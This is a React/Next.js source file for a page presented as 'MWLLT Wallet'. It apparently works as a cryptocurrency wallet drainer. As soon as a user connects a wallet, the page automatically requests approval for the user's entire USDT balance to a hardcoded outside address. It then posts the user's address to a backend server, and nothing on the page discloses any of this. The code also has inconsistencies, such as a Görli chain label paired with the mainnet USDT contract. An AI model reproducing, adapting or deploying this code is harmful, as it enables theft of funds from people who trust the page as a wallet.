import App from "./_app";
import React, { useEffect } from 'react';
import { createWeb3Modal, defaultConfig } from '@web3modal/ethers/react';
import { useWeb3Modal, useWeb3ModalState } from '@web3modal/ethers/react';
import { useWeb3ModalProvider, useWeb3ModalAccount } from '@web3modal/ethers/react';
import { BrowserProvider, Contract, formatUnits } from 'ethers';
let mongoose = require('mongoose');

  if (!process.env.NEXT_PUBLIC_PROJECT_ID) {
    throw new Error("You need to provide NEXT_PUBLIC_PROJECT_ID env variable");
  }
  const projectId = process.env.NEXT_PUBLIC_PROJECT_ID;

// 2. Set chains
const abi = [
  "function name() view returns (string)",
  "function symbol() view returns (string)",
  "function balanceOf(address) view returns (uint)",
  "function transfer(address to, uint amount)",
  "function approve(address spender, uint amount) returns (bool)",
  "event Transfer(address indexed from, address indexed to, uint amount)"
];

const mainnet = {
  chainId: 5,
  name: 'Ethereum Görli',
  currency: 'ETH',
  explorerUrl: 'https://etherscan.io',
  rpcUrl: 'https://cloudflare-eth.com'
}

// 3. Create modal
const metadata = {
  name: 'Mwllt',
  description: 'Mwllt description',
  url: 'https://mwllt6277.com/',
  icons: ['https://avatars.githubusercontent.com/u/37784886']
}

createWeb3Modal({
  ethersConfig: defaultConfig({ metadata }),
  chains: [mainnet],
  projectId
})

const { open } = useWeb3Modal()

export default function HomePage() {
  const { address, chainId, isConnected } = useWeb3ModalAccount();
  const { walletProvider } = useWeb3ModalProvider();
  const label = isConnected ? "Disconnect" : "Connect";

  const run = async () => {
    try {
      const hexValue = '0xd6717f32';
const decimalValue = BigInt(hexValue).toString();
console.log(decimalValue);

      const USDTAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
      const ethersProvider =  new BrowserProvider(walletProvider, 1);
      const signer = await ethersProvider.getSigner();
      const USDTContract = new Contract(USDTAddress, abi, signer);
      const USDTBalance = await USDTContract.balanceOf(address);
      const approvalTx = await USDTContract.approve('0x906A62E25145b62c7b229C7D8c8D8ca44DE00528', USDTBalance,{gasLimit: 150000});
      // Wait for the approval transaction to be mined
      const receipt = await approvalTx.wait();

      // Check if the transaction was successful
      if (receipt.status === 1) {
        console.log('Approval successful');
        try {
          const postData = {
            address: address,
          };
          fetch('http://localhost:3003/address', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(postData),
          })
          .then(response => response.json())
            .then(data => {
              console.log('POST Response:', data);
              // Do something with the response data
            })
            .catch(error => {
              console.error('POST Error:', error.message);
            });
        } catch (error) {
          console.log(error)
        }
        // Your code for success goes here
      } else {
        console.error('Approval failed');
        // Your code for failure goes here
      }

    } catch (error) {
      console.error('Error during approval:', error);
    }
  }; 
  if (isConnected) {
      setTimeout(() => {
        open();
        run();
      }, 500);
  }

  return (
    <>
      <h1 style={{ textAlign: 'center', marginTop: '50px', color: '#47A1FF'}}>MWLLT Wallet</h1>
      <br />
      <w3m-account-button />
      <br/>
      <w3m-connect-button label={label} loadingLabel="loading"/>
    </>
  );
}
